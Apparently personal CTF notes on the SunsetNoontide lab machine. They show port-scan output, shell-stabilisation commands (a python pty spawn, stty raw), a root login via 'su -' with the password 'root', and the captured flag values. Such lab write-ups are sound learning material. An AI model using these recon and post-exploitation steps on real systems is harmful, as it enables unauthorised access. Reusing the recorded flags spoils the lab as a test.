参考资料：  
SunsetNoontide
 
[https://cyberarri.com/2024/03/30/sunset-noontide-redo-pg-play-writeup/](https://cyberarri.com/2024/03/30/sunset-noontide-redo-pg-play-writeup/)
      

┌──(kali㉿kali)-[~/Desktop/pg02/SunsetNoontide]  
└─$ ./rustscan -a 192.168.212.120  
.----. .-. .-. .----..---. .----. .---. .--. .-. .-.  
| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |  
| .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |  
`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'  
The Modern Day Port Scanner.  
________________________________________  
: [http://discord.skerritt.blog](http://discord.skerritt.blog) :  
: [https://github.com/RustScan/RustScan](https://github.com/RustScan/RustScan) :  
--------------------------------------  
Port scanning: Making networking exciting since... whenever.
 
[~] The config file is expected to be at "/home/kali/.rustscan.toml"  
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers  
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.  
Open 192.168.212.120:6667  
Open 192.168.212.120:6697  
Open 192.168.212.120:8067  
[~] Starting Script(s)  
[~] Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-11-14 23:49 EST  
Initiating Ping Scan at 23:49  
Scanning 192.168.212.120 [4 ports]  
Completed Ping Scan at 23:49, 0.12s elapsed (1 total hosts)  
Initiating Parallel DNS resolution of 1 host. at 23:49  
Completed Parallel DNS resolution of 1 host. at 23:49, 0.09s elapsed  
DNS resolution of 1 IPs took 0.09s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]  
Initiating SYN Stealth Scan at 23:49  
Scanning 192.168.212.120 [3 ports]  
Discovered open port 8067/tcp on 192.168.212.120  
Discovered open port 6697/tcp on 192.168.212.120  
Discovered open port 6667/tcp on 192.168.212.120  
Completed SYN Stealth Scan at 23:49, 0.12s elapsed (3 total ports)  
Nmap scan report for 192.168.212.120  
Host is up, received reset ttl 61 (0.093s latency).  
Scanned at 2025-11-14 23:49:19 EST for 1s
 
PORT STATE SERVICE REASON  
6667/tcp open irc syn-ack ttl 61  
6697/tcp open ircs-u syn-ack ttl 61  
8067/tcp open infi-async syn-ack ttl 61
 
Read data files from: /usr/share/nmap  
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds  
Raw packets sent: 7 (284B) | Rcvd: 4 (172B)
  ┌──(kali㉿kali)-[~/Desktop/pg02/SunsetNoontide]  
└─$
   

python3 -c 'import pty; pty.spawn("/bin/bash")'  
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp  
export TERM=xterm-256color  
I then used Ctrl+Z to background the process  
stty raw -echo ; fg ; reset  
stty columns 200 rows 200
   

server@noontide:~$ cat local.txt  
cat local.txt  
fcd83b907d6d68eb5010f48542c6d339  
server@noontide:~$
   

server@noontide:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp  
\<l/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp  
server@noontide:~$ sudo -l  
sudo -l  
bash: sudo: command not found  
server@noontide:~$ su -  
su -  
Password: root
 
root@noontide:~# ls  
ls  
proof.txt  
root@noontide:~# cat proof.txt  
cat proof.txt  
a1d894d762e221b5f0152e25ca9aea1e  
root@noontide:~#